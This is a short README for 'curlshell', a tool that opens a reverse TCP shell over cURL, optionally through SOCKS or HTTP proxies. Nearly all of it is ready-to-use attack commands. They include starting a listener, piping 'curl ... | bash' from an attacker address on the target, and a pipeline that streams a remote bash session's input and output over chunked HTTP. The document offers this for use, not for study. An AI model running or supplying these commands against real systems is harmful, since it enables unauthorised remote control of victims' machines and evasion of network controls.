# Reverse shell using curl

(Cloned from [https://github.com/irsl/curlshell](https://github.com/irsl/curlshell); slightly enhanced)

A reverse TCP shell through a proxy (using cURL).

Generate a SSL Certificate:
```sh
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -sha256 -days 3650 -nodes -subj "/CN=THC"
```

## Without Proxy

```sh
# Start your listener
./curlshell.py --certificate cert.pem --private-key key.pem --listen-port 8080
```
```sh
# On the target:
curl -skfL https://1.2.3.4:8080 | bash
```

## With SOCKS Proxy
```sh
./curlshell.py -x socks5h://5.5.5.5:1080 --certificate cert.pem --private-key key.pem --listen-port 8080 
```
```sh
curl -x socks5h://5.5.5.5:1080 -skfL https://1.2.3.4:8080 | bash
```

## With HTTP Proxy
```sh
./curlshell.py -x http://5.5.5.5:3128 --certificate cert.pem --private-key key.pem --listen-port 8080 
```
```sh
curl -x http://5.5.5.5:1080 -skfL https://1.2.3.4:8080 | bash
```

## With HTTP (plaintext)
```sh
./curlshell.py --listen-port 8080
```
```sh
curl -sfL http://1.2.3.4:8080 | bash
```

# How it works
The first cURL request pipes this into a bash:
```sh
stdbuf -i0 -o0 -e0 curl -X POST -sk https://1.2.3.4:8080/input \
    | bash 2> >(curl -sk -T - https://1.2.3.4:8080/stderr) \
    | curl -sk -T - https://1.2.3.4:8080/stdout
```

The bash then starts 3 cURL processes to connect stdin, stdout and stderr. HTTP's 'chunked transfer' does the rest.

